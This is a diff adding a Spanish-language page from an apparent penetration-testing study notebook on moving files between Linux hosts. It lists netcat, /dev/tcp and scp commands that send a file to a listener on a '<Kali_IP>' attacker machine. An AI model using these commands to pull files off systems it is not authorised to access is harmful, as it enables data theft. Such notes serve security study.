@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Linux -> Linux | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="linux-linux">
+          <div class="note-tabbar">
+            <span>Linux -> Linux</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Transferencia de Archivos/Linux -> Linux</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">transferencia de archivos / linux a linux</p>
+            <h2>Linux -> Linux</h2>
+
+            <section class="code-card">
+              <h3>Transferencia de archivo netcat</h3>
+              <pre><code># Linux
+nc &lt;Kali_IP&gt; 443 &lt; file
+# Kali
+nc -nlvp 443 &gt; file
+# Comprobar Integridad con md5sum
+md5sum file # Ver mismo hash para ambos file</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Transferencia de archivo netcat y cat</h3>
+              <pre><code># Linux
+cat &lt; file &gt; /dev/tcp/&lt;Kali_IP&gt;/443
+# Kali
+nc -nlvp 443 &gt; file
+# Comprobar Integridad con md5sum
+md5sum file # Ver mismo hash para ambos file</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>SCP</h3>
+              <pre><code># Kali
+scp &lt;user&gt;@&lt;linux_ip&gt;:/path/file .
+# Password de &lt;user&gt;: &lt;pass&gt;</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>transferencia_archivos</span>
+              <span>linux</span>
+              <span>scp</span>
+              <span>netcat</span>
+              <span>md5sum</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
